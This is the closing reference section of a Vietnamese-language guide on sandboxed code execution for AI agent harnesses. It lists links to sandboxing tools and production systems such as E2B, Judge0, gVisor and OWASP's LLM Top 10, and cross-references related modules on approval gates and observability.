7. **isolate** — https://github.com/containers/isolate
8. **Anthropic Claude Code sandboxing** — https://docs.anthropic.com/en/docs/claude-code/security
9. **OWASP Top 10 for LLM Applications** — https://owasp.org/www-project-top-10-for-large-language-model-applications/

### Production Systems

- **E2B** — https://e2b.dev — sandbox microVM Firecracker dạng dịch vụ
- **Judge0** — https://judge0.com — thực thi đặc quyền tối thiểu cho chương trình không tin cậy
- **OpenHands runtime** — https://docs.all-hands.dev/usage/runtimes/docker
- **SWE-agent container setup** — https://swe-agent.com
- **Fly Machines** — https://fly.io/docs/machines/ — compute microVM
- **gVisor trong GKE** — https://gvisor.dev/docs/user_guide/quick_start/kubernetes/

### Module Liên Quan

- `06-decide-tools-mcp/README.md` §17.2-17.4 — bản sketch sandbox ngắn gốc, quy tắc client MCP
- `06-decide-tools-mcp/code-mode-sdk.md` §5 — mẫu code-mode (cần một sandbox thật)
- `09-multi-agent/README.md` §16.4 — sandbox theo agent + cô lập secret
- `10-automation/README.md` §17.3 — loop budget / deadline toàn run
- `13-trajectory-observability/README.md` — audit trail mà mỗi lần chạy sandbox ghi vào
- `15-approval-gates/README.md` — human gate cho tầng `elevated` và `prod-auth`

---

*Tài liệu: Harness 12. Sandbox Execution — HARNESS ENGINEERING EDITION*
*Module cross-cutting · nhà chính thức của khái niệm sandbox*
*Cập nhật: 19/07/2026*
*Tác giả: AI Knowledge Repository*
